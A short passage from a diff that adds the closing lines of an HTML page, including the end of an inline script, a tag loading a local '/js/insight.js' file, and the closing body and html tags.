+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+
+
+
+
+</body>
+</html>
